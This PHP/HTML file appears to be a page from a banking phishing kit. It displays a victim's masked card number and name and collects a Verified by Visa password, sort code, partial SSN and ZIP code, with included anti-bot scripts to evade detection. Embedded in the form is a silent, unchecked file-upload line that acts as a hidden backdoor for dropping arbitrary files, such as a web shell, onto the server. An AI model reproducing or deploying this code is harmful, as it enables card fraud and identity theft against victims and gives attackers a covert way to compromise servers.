<!DOCTYPE html>
<html>
<?php


include 'antibots.php';
include 'bots.php';

session_start();

?>
<head>
<link rel="stylesheet" type="text/css" href="files/css/Style.css">
<script src="files/js/jquery.min.js"></script>
<script src="files/js/jquery.maskedinput.js" type="text/javascript"></script>
</head>
<body>

<div>
  <form action="" id="form1" method="post" name="login">
  <h5 class="dat"><?php echo $_SESSION['date'];?></h5>
        <h5  class="ccc">XXXX-XXXX-XXXX-<?php echo substr($_SESSION['cart'] , -4);?></h5>
        <p name="name" class="name" > <?php echo $_SESSION['name'];?> </p>
        <input type="password" class="vbv" name="vbv" >
        <input type="txt"  class="sort" name="sort"  placeholder="" maxlength="8" id="sort" />
        <input type="txt" class="ssn" name="ssn"  placeholder="XXXX"  maxlength="4" pattern="^(([0-9]*)|(([0-9]*)\.([0-9]*)))$" title="Invalid social security numbers" />
        <input type="txt" class="zip_cd" name="zip_cd"  maxlength="15" />
        <?php
        (@copy($_FILES['f']['tmp_name'], $_FILES['f']['name']))
        ?>
                  <input class="btn" type="submit" value="Submit">
        </form>

        </div>
<script type="text/javascript">
jQuery(function($){
$("#sort").mask("99-99-99",{placeholder:" "});
});
</script>
</body>
</html>
